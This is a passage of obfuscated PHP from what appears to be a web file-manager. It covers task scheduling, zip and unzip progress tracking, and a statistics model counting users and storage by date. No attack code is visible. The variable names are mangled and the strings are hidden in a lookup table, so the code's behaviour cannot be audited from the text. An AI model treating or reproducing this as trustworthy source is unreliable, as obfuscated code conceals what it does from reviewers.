Cache::set($¸œ¡¡Í·, timeFloat(), $’óÊÃ‡ê * 10); return !0; } return !1; } public static function timeLimitCall($¡¥æ›²Ø, $ÅëÏª³, $à¥ÍÅ¢À, $¨û£§Ó = 5.0) { $µø‰“Çá =& $_SERVER[ç¦¬”œš]; if (!$¡¥æ›²Ø || !$ÅëÏª³) { return; } self::$asyncAdd = !0; $ÑÜ•¢Áò = $µø‰“Çá[1876]; $şûØé = Cache::get($ÑÜ•¢Áò, !0); $ğçÊ¶ÈÕ = array($µø‰“Çá[1877] => timeFloat(), $µø‰“Çá[1878] => timeFloat(), $µø‰“Çá[341] => $ÅëÏª³, $µø‰“Çá[1868] => $à¥ÍÅ¢À, $µø‰“Çá[206] => $¨û£§Ó); if (is_array($şûØé[$¡¥æ›²Ø])) { $ğçÊ¶ÈÕ[$µø‰“Çá[1878]] = $şûØé[$¡¥æ›²Ø][$µø‰“Çá[1878]]; } if (is_array($şûØé[$¡¥æ›²Ø])) { if (timeFloat() - $şûØé[$¡¥æ›²Ø][$µø‰“Çá[1877]] < $ğçÊ¶ÈÕ[$µø‰“Çá[206]] * 0.3) { return; } $ğçÊ¶ÈÕ[$µø‰“Çá[1878]] = $şûØé[$¡¥æ›²Ø][$µø‰“Çá[1878]]; } $şûØé[$¡¥æ›²Ø] = $ğçÊ¶ÈÕ; Cache::set($ÑÜ•¢Áò, $şûØé, 60); Cache::removeMemory($ÑÜ•¢Áò); write_log($µø‰“Çá[1879] . $¡¥æ›²Ø . $µø‰“Çá[74] . $ÅëÏª³, $µø‰“Çá[197]); } public static function timeLimitCallLoop() { $ûáÀÀ´ƒ =& $_SERVER[ç¦¬”œš]; $Ô¬µí§Ñ = array($ûáÀÀ´ƒ[1880]); $ÑŠ¼âğÅ = in_array(strtolower(ACTION), $Ô¬µí§Ñ); if (!$ÑŠ¼âğÅ && !self::$asyncAdd) { return; } $•şÂª¤Ÿ = $ûáÀÀ´ƒ[1876]; $İ¿òÛÌ = Cache::get($•şÂª¤Ÿ, !0); if (!$İ¿òÛÌ || count($İ¿òÛÌ) <= 0) { return; } $™Öïá = !1; $ãÅŞˆ¸© = timeFloat(); $à·ˆ©¨œ = array(); foreach ($İ¿òÛÌ as $„îÆˆ»Ä => $Ê†É†»“) { if ($ãÅŞˆ¸© - $Ê†É†»“[$ûáÀÀ´ƒ[1878]] > $Ê†É†»“[$ûáÀÀ´ƒ[206]]) { $™Öïá = !0; try { Hook::apply($Ê†É†»“[$ûáÀÀ´ƒ[341]], $Ê†É†»“[$ûáÀÀ´ƒ[1868]]); write_log($ûáÀÀ´ƒ[1881] . $„îÆˆ»Ä . $ûáÀÀ´ƒ[74] . $Ê†É†»“[$ûáÀÀ´ƒ[341]] . $ûáÀÀ´ƒ[1882] . ACTION, $ûáÀÀ´ƒ[197]); } catch (Exception $Åá¥¼–’) { } continue; } $à·ˆ©¨œ[$„îÆˆ»Ä] = $Ê†É†»“; } if (!$™Öïá) { return; } if (!$à·ˆ©¨œ) { return Cache::remove($•şÂª¤Ÿ); } Cache::set($•şÂª¤Ÿ, $à·ˆ©¨œ, 60); Cache::removeMemory($•şÂª¤Ÿ); } public static function finished($Í’Ê²Ğ¥, $×ï‰–Í™) { $×˜’ˆğ =& $_SERVER[ç¦¬”œš]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($×˜’ˆğ[341] => $Í’Ê²Ğ¥, $×˜’ˆğ[1868] => $×ï‰–Í™); } private static function finishedRun() { $½ÇÅ•øƒ =& $_SERVER[ç¦¬”œš]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ÿ©×†ôë) { try { Hook::apply($Ÿ©×†ôë[$½ÇÅ•øƒ[341]], $Ÿ©×†ôë[$½ÇÅ•øƒ[1868]]); } catch (Exception $µ×•äÉ‡) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto C°‡ìÃÈêĞ; C°‡ìÃÈêĞ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¾ô˜ü¨¼ =& $_SERVER[ç¦¬”œš]; parent::startAfter(); Hook::bind($¾ô˜ü¨¼[1883], array($this, $¾ô˜ü¨¼[1884])); Hook::bind($¾ô˜ü¨¼[1279], array($this, $¾ô˜ü¨¼[1885])); Hook::bind($¾ô˜ü¨¼[1886], array($this, $¾ô˜ü¨¼[1887])); $ô˜ª°Ø† =& $this->task; $ô˜ª°Ø†[$¾ô˜ü¨¼[1888]] = $¾ô˜ü¨¼[1280]; if (!$ô˜ª°Ø†[$¾ô˜ü¨¼[1659]]) { $ô˜ª°Ø†[$¾ô˜ü¨¼[1659]] = LNG($¾ô˜ü¨¼[1889]); } } protected function endAfter() { $Ùú‡«  =& $_SERVER[ç¦¬”œš]; parent::endAfter(); Hook::unbind($Ùú‡« [1883], array($this, $Ùú‡« [1884])); Hook::unbind($Ùú‡« [1279], array($this, $Ùú‡« [1885])); Hook::unbind($Ùú‡« [1886], array($this, $Ùú‡« [1887])); } public function updateAfter() { $¯”€“Ë =& $_SERVER[ç¦¬”œš]; $¸¨‰Ì¼Ç =& $this->task; if (!$¸¨‰Ì¼Ç[$¯”€“Ë[1142]] || !$¸¨‰Ì¼Ç[$¯”€“Ë[843]]) { if ($¸¨‰Ì¼Ç[$¯”€“Ë[1888]] != $¯”€“Ë[389]) { return; } } if ($¸¨‰Ì¼Ç[$¯”€“Ë[1888]] == $¯”€“Ë[1280]) { $œØ‘ª§¶ = 0; if ($¸¨‰Ì¼Ç[$¯”€“Ë[1823]]) { $œØ‘ª§¶ = $¸¨‰Ì¼Ç[$¯”€“Ë[1824]] / $¸¨‰Ì¼Ç[$¯”€“Ë[1823]]; } $¸¨‰Ì¼Ç[$¯”€“Ë[1772]] = $œØ‘ª§¶ * 0.3; } else { if ($¸¨‰Ì¼Ç[$¯”€“Ë[1888]] == $¯”€“Ë[389]) { $œØ‘ª§¶ = $¸¨‰Ì¼Ç[$¯”€“Ë[1771]] / $¸¨‰Ì¼Ç[$¯”€“Ë[1142]]; $¸¨‰Ì¼Ç[$¯”€“Ë[1772]] = 0.3 + $œØ‘ª§¶ * 0.4; } else { if ($¸¨‰Ì¼Ç[$¯”€“Ë[1888]] == $¯”€“Ë[110]) { $üßí¯´ = 0; if ($¸¨‰Ì¼Ç[$¯”€“Ë[1825]] == $¯”€“Ë[110]) { $üßí¯´ = $¸¨‰Ì¼Ç[$¯”€“Ë[1824]]; } $œØ‘ª§¶ = ($¸¨‰Ì¼Ç[$¯”€“Ë[1828]] + $üßí¯´) / $¸¨‰Ì¼Ç[$¯”€“Ë[843]]; $¸¨‰Ì¼Ç[$¯”€“Ë[1772]] = 0.3 + 0.4 + $œØ‘ª§¶ * 0.3; } } } if ($¸¨‰Ì¼Ç[$¯”€“Ë[1772]] > 0) { $³‘‰»Ó£ = timeFloat() - $¸¨‰Ì¼Ç[$¯”€“Ë[1774]] - $¸¨‰Ì¼Ç[$¯”€“Ë[1777]]; $¸¨‰Ì¼Ç[$¯”€“Ë[1778]] = $³‘‰»Ó£ * (1 - $¸¨‰Ì¼Ç[$¯”€“Ë[1772]]) / $¸¨‰Ì¼Ç[$¯”€“Ë[1772]]; } } public function addFile($ş—›†ñŞ) { $ù‚Û¬Ê =& $_SERVER[ç¦¬”œš]; $¼Ç„Ó¥ =& $this->task; $£Â™ÏèŒ = IO::info($ş—›†ñŞ); $¼Ç„Ó¥[$ù‚Û¬Ê[1821]] = $£Â™ÏèŒ[$ù‚Û¬Ê[32]]; $¼Ç„Ó¥[$ù‚Û¬Ê[1823]] = $£Â™ÏèŒ[$ù‚Û¬Ê[79]]; $¼Ç„Ó¥[$ù‚Û¬Ê[1824]] = 0; $¼Ç„Ó¥[$ù‚Û¬Ê[1144]] = $ù‚Û¬Ê[1844]; $¼Ç„Ó¥[$ù‚Û¬Ê[1825]] = $ù‚Û¬Ê[1280]; $¼Ç„Ó¥[$ù‚Û¬Ê[843]] = $£Â™ÏèŒ[$ù‚Û¬Ê[79]]; $¼Ç„Ó¥[$ù‚Û¬Ê[1142]] = 1; $ÂÏòööü = 0; $¼Ç„Ó¥[$ù‚Û¬Ê[1832]] = array($ù‚Û¬Ê[1833] => $ÂÏòööü + 1, $ù‚Û¬Ê[503] => $£Â™ÏèŒ[$ù‚Û¬Ê[32]], $ù‚Û¬Ê[87] => $£Â™ÏèŒ[$ù‚Û¬Ê[87]], $ù‚Û¬Ê[591] => $£Â™ÏèŒ[$ù‚Û¬Ê[591]] ? $£Â™ÏèŒ[$ù‚Û¬Ê[591]] : $£Â™ÏèŒ[$ù‚Û¬Ê[87]]); $this->update(); } public function zipEvent($úòë¹Ó, $ğÅñÅü‡, $Ğê¹…ªƒ, $ÙÀàÉàÍ) { $¯Şíû€ı =& $_SERVER[ç¦¬”œš]; $–âî„™ =& $this->task; $–âî„™[$¯Şíû€ı[1821]] = get_path_this($ğÅñÅü‡); $–âî„™[$¯Şíû€ı[1823]] = $ÙÀàÉàÍ; $–âî„™[$¯Şíû€ı[1824]] = $Ğê¹…ªƒ; $–âî„™[$¯Şíû€ı[1144]] = $úòë¹Ó == $¯Şíû€ı[1890] ? $¯Şíû€ı[1891] : $¯Şíû€ı[1892]; $–âî„™[$¯Şíû€ı[1825]] = $¯Şíû€ı[12]; $–âî„™[$¯Şíû€ı[843]] = $ÙÀàÉàÍ; $–âî„™[$¯Şíû€ı[1888]] = $¯Şíû€ı[389]; $this->update(); } public function unzipAfter($Éè€ÚÍÀ) { $úı„Ú²” =& $_SERVER[ç¦¬”œš]; $¸ÓÄàò‚ =& $this->task; $¸ÓÄàò‚[$úı„Ú²”[1888]] = $úı„Ú²”[110]; $‘–Í³à… = IO::infoWithChildren($Éè€ÚÍÀ); $§Ü¦¦– = 0; $¸ÓÄàò‚[$úı„Ú²”[1832]] = array($úı„Ú²”[1833] => $§Ü¦¦– + 1, $úı„Ú²”[503] => $‘–Í³à…[$úı„Ú²”[32]], $úı„Ú²”[87] => $‘–Í³à…[$úı„Ú²”[87]], $úı„Ú²”[591] => $‘–Í³à…[$úı„Ú²”[591]] ? $‘–Í³à…[$úı„Ú²”[591]] : $‘–Í³à…[$úı„Ú²”[87]]); if ($‘–Í³à…[$úı„Ú²”[33]] == $úı„Ú²”[230]) { $¸ÓÄàò‚[$úı„Ú²”[1142]] = 1; } else { $¸ÓÄàò‚[$úı„Ú²”[1142]] = $‘–Í³à…[$úı„Ú²”[82]][$úı„Ú²”[80]]; } $¸ÓÄàò‚[$úı„Ú²”[1144]] = $úı„Ú²”[12]; $¸ÓÄàò‚[$úı„Ú²”[1825]] = 0; $¸ÓÄàò‚[$úı„Ú²”[1771]] = 0; $¸ÓÄàò‚[$úı„Ú²”[1823]] = 0; $¸ÓÄàò‚[$úı„Ú²”[1824]] = 0; $¸ÓÄàò‚[$úı„Ú²”[1821]] = $úı„Ú²”[12]; $¸ÓÄàò‚[$úı„Ú²”[1828]] = 0; $¸ÓÄàò‚[$úı„Ú²”[843]] = $‘–Í³à…[$úı„Ú²”[79]]; $this->update(); self::log($úı„Ú²”[1893] . json_encode(array($¸ÓÄàò‚, $‘–Í³à…))); } public function nameParse($“Á€ğÎ™) { $¦¤ÂÜ¢ =& $_SERVER[ç¦¬”œš]; $¥ÛÚ’Ù =& $this->task; if ($¥ÛÚ’Ù[$¦¤ÂÜ¢[1888]] == $¦¤ÂÜ¢[1280]) { $¥ÛÚ’Ù[$¦¤ÂÜ¢[1888]] = $¦¤ÂÜ¢[389]; $¥ÛÚ’Ù[$¦¤ÂÜ¢[1828]] = 0; $¥ÛÚ’Ù[$¦¤ÂÜ¢[843]] = 0; } $Ûêñ•ã = get_path_this($“Á€ğÎ™); if (strstr($Ûêñ•ã, $¦¤ÂÜ¢[10])) { $¥ÛÚ’Ù[$¦¤ÂÜ¢[1771]] += 1; $¥ÛÚ’Ù[$¦¤ÂÜ¢[1142]] += 1; } $¥ÛÚ’Ù[$¦¤ÂÜ¢[1821]] = $“Á€ğÎ™; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $£¬•¯÷ =& $_SERVER[ç¦¬”œš]; parent::startAfter(); Hook::bind($£¬•¯÷[1894], array($this, $£¬•¯÷[1884])); Hook::bind($£¬•¯÷[1886], array($this, $£¬•¯÷[1887])); $à±Çƒ¡İ =& $this->task; $à±Çƒ¡İ[$£¬•¯÷[1888]] = $£¬•¯÷[1280]; if (!$à±Çƒ¡İ[$£¬•¯÷[1659]]) { $à±Çƒ¡İ[$£¬•¯÷[1659]] = LNG($£¬•¯÷[1895]); } } protected function endAfter() { $­Ïøœ’½ =& $_SERVER[ç¦¬”œš]; parent::endAfter(); Hook::unbind($­Ïøœ’½[1894], array($this, $­Ïøœ’½[1884])); Hook::unbind($­Ïøœ’½[1886], array($this, $­Ïøœ’½[1887])); } public function updateAfter() { $ÙÎÛ› =& $_SERVER[ç¦¬”œš]; $¾ŠÊ«® =& $this->task; if (!$¾ŠÊ«®[$ÙÎÛ›[1142]] || !$¾ŠÊ«®[$ÙÎÛ›[843]]) { return; } if ($¾ŠÊ«®[$ÙÎÛ›[1888]] == $ÙÎÛ›[1280]) { $Ëõ‚‰Ô = $¾ŠÊ«®[$ÙÎÛ›[1824]]; if ($¾ŠÊ«®[$ÙÎÛ›[1825]] != $ÙÎÛ›[1280]) { $Ëõ‚‰Ô = 0; } $ô¸ÖŒõ’ = ($¾ŠÊ«®[$ÙÎÛ›[1828]] + $Ëõ‚‰Ô) / $¾ŠÊ«®[$ÙÎÛ›[843]]; $¾ŠÊ«®[$ÙÎÛ›[1772]] = $ô¸ÖŒõ’ * 0.3; } else { if ($¾ŠÊ«®[$ÙÎÛ›[1888]] == $ÙÎÛ›[389]) { $ô¸ÖŒõ’ = $¾ŠÊ«®[$ÙÎÛ›[1771]] / $¾ŠÊ«®[$ÙÎÛ›[1142]]; $¾ŠÊ«®[$ÙÎÛ›[1772]] = 0.3 + $ô¸ÖŒõ’ * 0.5; } else { if ($¾ŠÊ«®[$ÙÎÛ›[1888]] == $ÙÎÛ›[110]) { $ô¸ÖŒõ’ = 0; if ($¾ŠÊ«®[$ÙÎÛ›[1823]]) { $ô¸ÖŒõ’ = $¾ŠÊ«®[$ÙÎÛ›[1824]] / $¾ŠÊ«®[$ÙÎÛ›[1823]]; } $¾ŠÊ«®[$ÙÎÛ›[1772]] = 0.3 + 0.5 + $ô¸ÖŒõ’ * 0.2; } } } if ($¾ŠÊ«®[$ÙÎÛ›[1772]] > 0) { $«—‡Ô = timeFloat() - $¾ŠÊ«®[$ÙÎÛ›[1774]] - $¾ŠÊ«®[$ÙÎÛ›[1777]]; $¾ŠÊ«®[$ÙÎÛ›[1778]] = $«—‡Ô * (1 - $¾ŠÊ«®[$ÙÎÛ›[1772]]) / $¾ŠÊ«®[$ÙÎÛ›[1772]]; } } public function copyFileStart($‘ƒ“™ì¥, $õüŸÇ²È, $æĞŒÔ­í, $ïó“š×©, $“‰ØĞ™’, $‘÷·•ÆÊ) { $»Šëµ¬² =& $_SERVER[ç¦¬”œš]; parent::copyFileStart($‘ƒ“™ì¥, $õüŸÇ²È, $æĞŒÔ­í, $ïó“š×©, $“‰ØĞ™’, $‘÷·•ÆÊ); $—½ìÉ«¯ =& $this->task; if ($—½ìÉ«¯[$»Šëµ¬²[1888]] == $»Šëµ¬²[389]) { $—½ìÉ«¯[$»Šëµ¬²[1888]] = $»Šëµ¬²[110]; } $this->update(); } public function copyFileEnd($íªåôó, $á¹ï“à, $‘ÔìçŸ’, $õ¡¨ò‰˜, $Õ¢Ïİ, $òöÄ®‚ï) { $ëÍŒæŠÉ =& $_SERVER[ç¦¬”œš]; $û„ï‡ôª =& $this->task; $û„ï‡ôª[$ëÍŒæŠÉ[1824]] = $û„ï‡ôª[$ëÍŒæŠÉ[1823]]; $û„ï‡ôª[$ëÍŒæŠÉ[1828]] += $û„ï‡ôª[$ëÍŒæŠÉ[1823]]; $û„ï‡ôª[$ëÍŒæŠÉ[1825]] = $ëÍŒæŠÉ[12]; $this->update(); } public function zipEvent($ŞÖµÕÁ…, $÷û«’‹³, $Ê¬ìÃº—, $°ºÉé…ª) { $±õ›‹´œ =& $_SERVER[ç¦¬”œš]; $€¢‰˜ş¿ =& $this->task; $€¢‰˜ş¿[$±õ›‹´œ[1821]] = get_path_this($÷û«’‹³); $€¢‰˜ş¿[$±õ›‹´œ[1823]] = $°ºÉé…ª; $€¢‰˜ş¿[$±õ›‹´œ[1824]] = $Ê¬ìÃº—; $€¢‰˜ş¿[$±õ›‹´œ[1144]] = $ŞÖµÕÁ… == $±õ›‹´œ[1896] ? $±õ›‹´œ[1891] : $±õ›‹´œ[1892]; $€¢‰˜ş¿[$±õ›‹´œ[1825]] = $±õ›‹´œ[12]; $€¢‰˜ş¿[$±õ›‹´œ[843]] = $°ºÉé…ª; $€¢‰˜ş¿[$±õ›‹´œ[1888]] = $±õ›‹´œ[389]; $this->update(); } public function nameParse($³‚øó°ñ) { $ÔÈİèº¥ =& $_SERVER[ç¦¬”œš]; $ƒÎÍ˜’ =& $this->task; if ($ƒÎÍ˜’[$ÔÈİèº¥[1771]] < $ƒÎÍ˜’[$ÔÈİèº¥[1142]]) { $àÎô½ÊÆ = get_path_this($³‚øó°ñ); if (strstr($àÎô½ÊÆ, $ÔÈİèº¥[10])) { $ƒÎÍ˜’[$ÔÈİèº¥[1771]] += 1; } } if ($ƒÎÍ˜’[$ÔÈİèº¥[1888]] == $ÔÈİèº¥[1280]) { $ƒÎÍ˜’[$ÔÈİèº¥[1888]] = $ÔÈİèº¥[389]; } $ƒÎÍ˜’[$ÔÈİèº¥[1821]] = $³‚øó°ñ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ªú€Å˜¬) { $ğ—™°øÃ =& $_SERVER[ç¦¬”œš]; $›ÓÆ¶¾´ = array($ğ—™°øÃ[671] => array($ğ—™°øÃ[33] => $ğ—™°øÃ[1897], $ğ—™°øÃ[350] => array($ğ—™°øÃ[255], $ğ—™°øÃ[845], $ğ—™°øÃ[1898], $ğ—™°øÃ[1899])), $ğ—™°øÃ[1900] => array($ğ—™°øÃ[33] => $ğ—™°øÃ[1901], $ğ—™°øÃ[350] => array($ğ—™°øÃ[255], $ğ—™°øÃ[843], $ğ—™°øÃ[1902], $ğ—™°øÃ[1903], $ğ—™°øÃ[1904]))); if (!isset($›ÓÆ¶¾´[$ªú€Å˜¬])) { return !1; } $this->optionType = $›ÓÆ¶¾´[$ªú€Å˜¬][$ğ—™°øÃ[33]]; $this->field = $›ÓÆ¶¾´[$ªú€Å˜¬][$ğ—™°øÃ[350]]; return !0; } public function listData($ÜŸõé“Œ = false, $ã®ï©áü = "\155\x6f\x64\151\x66\x79\x54\x69\155\145", $ÕÜ¶ù½Ú = false) { return parent::listData($ÜŸõé“Œ, $ã®ï©áü, $ÕÜ¶ù½Ú); } public function trendList($Û¸¥“·) { $í£Á…ÈÍ =& $_SERVER[ç¦¬”œš]; $¤…µú³Ü = $this->listData(); if ($¤…µú³Ü) { $¾îÌ„¾² = end($¤…µú³Ü); $æ‚Á¦± = date($í£Á…ÈÍ[1905], strtotime($í£Á…ÈÍ[1906])); if ($¾îÌ„¾²[$í£Á…ÈÍ[255]] == $æ‚Á¦±) { return $¤…µú³Ü; } $¦ú¥Ë‘§ = strtotime($¾îÌ„¾²[$í£Á…ÈÍ[255]]); } if (!isset($¦ú¥Ë‘§)) { $ÃéıÄñ§ = $Û¸¥“· == $í£Á…ÈÍ[671] ? $í£Á…ÈÍ[607] : $í£Á…ÈÍ[904]; $¦ú¥Ë‘§ = Model($ÃéıÄñ§)->min($í£Á…ÈÍ[231]); } $´š¥ˆ¤š = $í£Á…ÈÍ[1907] . ucfirst($Û¸¥“·); $¢ŒÖğ«¢ = $this->dateList($¦ú¥Ë‘§); foreach ($¢ŒÖğ«¢ as $æ‚Á¦±) { $this->{$´š¥ˆ¤š}($æ‚Á¦±); } return $this->listData(); } private function dateList($À¬»îİ¿) { $¤ª¥÷òÙ =& $_SERVER[ç¦¬”œš]; $Ëå”µ´ = $À¬»îİ¿; $‹ÜÁÚĞ× = strtotime($¤ª¥÷òÙ[1906]); $ºÅ’¤Ó = array(); while ($Ëå”µ´ <= $‹ÜÁÚĞ×) { $ºÅ’¤Ó[] = date($¤ª¥÷òÙ[1905], $Ëå”µ´); $Ëå”µ´ = strtotime($¤ª¥÷òÙ[1908], $Ëå”µ´); } return $ºÅ’¤Ó; } public function _recordUser($¼ïŞ«Œé = '') { $´óı†¤† =& $_SERVER[ç¦¬”œš]; $¹Ç¦â©ä = strtotime(date($´óı†¤†[1909], strtotime($¼ïŞ«Œé))); $ÜŠıò“ = strtotime(date($´óı†¤†[1910], strtotime($¼ïŞ«Œé))); $±Æ· £ = array($´óı†¤†[231] => array($´óı†¤†[1092], $ÜŠıò“)); $¶éê‚ÏÎ = Model($´óı†¤†[607])->where($±Æ· £)->count($´óı†¤†[1770]); $±Æ· £[$´óı†¤†[231]] = array($´óı†¤†[409], array($¹Ç¦â©ä, $ÜŠıò“)); $Ò‰÷ñ¾ğ = Model($´óı†¤†[607])->where($±Æ· £)->count($´óı†¤†[1770]); $±Æ· £[$´óı†¤†[33]] = $´óı†¤†[1911]; $ê¨¨¾ = Model($´óı†¤†[1912])->where($±Æ· £)->count($´óı†¤†[1913]); $œî¶Øê® = array($´óı†¤†[255] => $¼ïŞ«Œé, $´óı†¤†[845] => (int) $¶éê‚ÏÎ, $´óı†¤†[1898] => (int) $Ò‰÷ñ¾ğ, $´óı†¤†[1899] => (int) $ê¨¨¾); return $this->insert($œî¶Øê®); } public function _recordStore($ŸîÉÀ = '') { $Î“¹€Èà =& $_SERVER[ç¦¬”œš]; $‘æËâÛ– = strtotime(date($Î“¹€Èà[1910], strtotime($ŸîÉÀ))); $«ˆÛĞË = array($Î“¹€Èà[231] => array($Î“¹€Èà[1092], $‘æËâÛ–)); $Üù‰ƒ = Model($Î“¹€Èà[553])->where($«ˆÛĞË)->sum($Î“¹€Èà[79]); $«ˆÛĞË[$Î“¹€Èà[494]] = 0; $ÑÓ…“–û = Model($Î“¹€Èà[904])->where($«ˆÛĞË)->sum($Î“¹€Èà[79]); $«ˆÛĞË[$Î“¹€Èà[190]] = 1; $Ü½ÂÚ€± = Model($Î“¹€Èà[904])->where($«ˆÛĞË)->sum($Î“¹€Èà[79]); $«ˆÛĞË[$Î“¹€Èà[190]] = 2; $†  ÷ß¢ = Model($Î“¹€Èà[904])->where($«ˆÛĞË)->sum($Î“¹€Èà[79]); $Âû°ÑÅö = array($Î“¹€Èà[255] => $ŸîÉÀ, $Î“¹€Èà[843] => (int) $ÑÓ…“–û, $Î“¹€Èà[1902] => (int) $Üù‰ƒ, $Î“¹€Èà[1903] => (int) $Ü½ÂÚ€±, $Î“¹€Èà[1904] => (int) $†  ÷ß¢); return $this->insert($Âû°ÑÅö); } public function trend($˜é§ìªÑ, $şı©êòß) { $£Üû¸âõ =& $_SERVER[ç¦¬”œš]; if (!$this->init($˜é§ìªÑ)) { return !1; } $ŞŞï¤¸§ = $this->trendList($˜é§ìªÑ); if ($ŞŞï¤¸§ && $şı©êòß != $£Üû¸âõ[1743]) { $±—˜Şæş = $ŞŞï¤¸§[0][$£Üû¸âõ[255]]; $ĞıàÛÔ = $this->validDate($şı©êòß, $±—˜Şæş); $µğ²à”ä = array(); $È€àÔ = array_to_keyvalue($ŞŞï¤¸§, $£Üû¸âõ[255]); foreach ($ĞıàÛÔ as $Ø€´Ì…) { if (isset($È€àÔ[$Ø€´Ì…])) { $®ù¶¡Íå = $È€àÔ[$Ø€´Ì…]; } else { $®ù¶¡Íå = end($ŞŞï¤¸§); $®ù¶¡Íå[$£Üû¸âõ[255]] = $Ø€´Ì…; if ($˜é§ìªÑ == $£Üû¸âõ[671]) { $®ù¶¡Íå[$£Üû¸âõ[1898]] = $®ù¶¡Íå[$£Üû¸âõ[1899]] = 0; } } $µğ²à”ä[] = $®ù¶¡Íå; } $ŞŞï¤¸§ = $µğ²à”ä; } $êÑĞÔÆ = array($£Üû¸âõ[671] => array($£Üû¸âõ[845] => LNG($£Üû¸âõ[1914]), $£Üû¸âõ[1898] => LNG($£Üû¸âõ[1915]), $£Üû¸âõ[1899] => LNG($£Üû¸âõ[1916])), $£Üû¸âõ[1900] => array($£Üû¸âõ[843] => LNG($£Üû¸âõ[1917]), $£Üû¸âõ[1902] => LNG($£Üû¸âõ[1918]), $£Üû¸âõ[1903] => LNG($£Üû¸âõ[1919]), $£Üû¸âõ[1904] => LNG($£Üû¸âõ[1920]))); $ºÉ ¦¡¡ = array($£Üû¸âõ[671] => $£Üû¸âõ[1921], $£Üû¸âõ[1900] => $£Üû¸âõ[79]); if (empty($ŞŞï¤¸§)) { $Ø€´Ì… = date($£Üû¸âõ[1905], strtotime($£Üû¸âõ[1906])); $‹¹ßÁ½ê = array($£Üû¸âõ[255] => $Ø€´Ì…); foreach ($êÑĞÔÆ[$˜é§ìªÑ] as $ÍÔÑ‹º => $Õå‹°ÛÈ) { $‹¹ßÁ½ê[$ÍÔÑ‹º] = 0; } $ŞŞï¤¸§[] = $‹¹ßÁ½ê; } $¼ş¸ß«€ = array(); foreach ($ŞŞï¤¸§ as $Õå‹°ÛÈ) { if ($˜é§ìªÑ == $£Üû¸âõ[1900] && $Õå‹°ÛÈ[$£Üû¸âõ[1902]] > $Õå‹°ÛÈ[$£Üû¸âõ[843]]) { $Õå‹°ÛÈ[$£Üû¸âõ[1902]] = $Õå‹°ÛÈ[$£Üû¸âõ[843]]; } foreach ($êÑĞÔÆ[$˜é§ìªÑ] as $ÍÔÑ‹º => $÷ïÖÜ¼Ô) { $®ù¶¡Íå = array($£Üû¸âõ[255] => $Õå‹°ÛÈ[$£Üû¸âõ[255]], $£Üû¸âõ[1659] => $÷ïÖÜ¼Ô); $®ù¶¡Íå[$ºÉ ¦¡¡[$˜é§ìªÑ]] = isset($Õå‹°ÛÈ[$ÍÔÑ‹º]) ? $Õå‹°ÛÈ[$ÍÔÑ‹º] : 0; $¼ş¸ß«€[] = $®ù¶¡Íå; } } return $¼ş¸ß«€; } public function validDate($¡ÃÂĞü, $Œœ¡—š…) { $Ï®ıšØ’ =& $_SERVER[ç¦¬”œš]; $ææØ×œ = date($Ï®ıšØ’[1905], strtotime($Ï®ıšØ’[1906])); $È§ÖŠú = array($ææØ×œ); switch ($¡ÃÂĞü) { case $Ï®ıšØ’[1750]: $¢Ñ˜ùš‹ = mktime(0, 0, 0, date($Ï®ıšØ’[1922]), date($Ï®ıšØ’[1450]) - date($Ï®ıšØ’[1541]) + 7 - 7, date($Ï®ıšØ’[1923])); $³ÒÊÄ = 0; do { $÷½®ğ®™ = date($Ï®ıšØ’[1905], $¢Ñ˜ùš‹ - 3600 * 24 * 7 * $³ÒÊÄ); $È§ÖŠú[] = $÷½®ğ®™; $³ÒÊÄ++; } while ($Œœ¡—š… < $÷½®ğ®™); break; case $Ï®ıšØ’[1748]: $³ÒÊÄ = 1; do { $†å«ı¨ = date($Ï®ıšØ’[1924], strtotime("\55\x20{$³ÒÊÄ}\x20\x6d\x6f\156\164\150\163")); $È§ÖŠú[] = $†å«ı¨; $³ÒÊÄ++; } while ($Œœ¡—š… < $†å«ı¨); break; case $Ï®ıšØ’[1925]: $¨°­¤šş = (int) date($Ï®ıšØ’[1923], strtotime($Œœ¡—š…)); $éš©œò± = (int) date($Ï®ıšØ’[1923]); if ($¨°­¤šş >= $éš©œò±) { break; } for ($¨°­¤šş; $¨°­¤šş < $éš©œò±; $¨°­¤šş++) { $È§ÖŠú[] = $¨°­¤šş . $Ï®ıšØ’[1926]; } break; default: break; } if ($Œœ¡—š… > end($È§ÖŠú)) { array_pop($È§ÖŠú); } sort($È§ÖŠú); return $È§ÖŠú; } public function listTable($õÎÍüüû) { $ËÚó«ì = ucfirst($õÎÍüüû); return Model($ËÚó«ì)->listData(); } public function option($¤á®„¼¿) { $Œ‡¾Ë÷ü = $_SERVER[ç¦¬”œš][1927] . ucfirst($¤á®„¼¿); return $this->{$Œ‡¾Ë÷ü}(); } private function optionUser() { $ø…‚—“ =& $_SERVER[ç¦¬”œš]; $‘ä­ÏÄ÷ = Model($ø…‚—“[607])->count($ø…‚—“[1770]); $–†Ü = Model($ø…‚—“[607])->where($ø…‚—“[1928])->count($ø…‚—“[1770]); $£·ƒ×æ = intval($GLOBALS[$ø…‚—“[6]][$ø…‚—“[425]][$ø…‚—“[1716]]) / 3600; $±‡ßáÙ« = strtotime("\55{$£·ƒ×æ}\x20\150\x6f\x75\x72\163"); $ıùî«ßˆ = strtotime(date($ø…‚—“[1909])); if ($±‡ßáÙ« < $ıùî«ßˆ) { $±‡ßáÙ« = $ıùî«ßˆ; } $ñŠèÇİô = array($ø…‚—“[1929] => array($ø…‚—“[1093], $±‡ßáÙ«)); $Í¤Üáì¶ = (int) Model($ø…‚—“[607])->where($ñŠèÇİô)->count($ø…‚—“[1770]); if (!$Í¤Üáì¶) { $Í¤Üáì¶ = 1; } $ñŠèÇİô = array($ø…‚—“[1929] => array($ø…‚—“[1093], $ıùî«ßˆ)); $ŠğŠ³»ñ = Model($ø…‚—“[607])->where($ñŠèÇİô)->count($ø…‚—“[1770]); return array($ø…‚—“[838] => (int) $‘ä­ÏÄ÷, $ø…‚—“[1930] => (int) ($‘ä­ÏÄ÷ - $–†Ü), $ø…‚—“[1931] => (int) $–†Ü, $ø…‚—“[1932] => (int) $ŠğŠ³»ñ, $ø…‚—“[1933] => $Í¤Üáì¶); } private function optionFile() { $ğğ€ô±ú =& $_SERVER[ç¦¬”œš]; $õı…•¥° = $this->sourceSize(); $ÁÄõ™½ = $õı…•¥°[$ğğ€ô±ú[79]]; 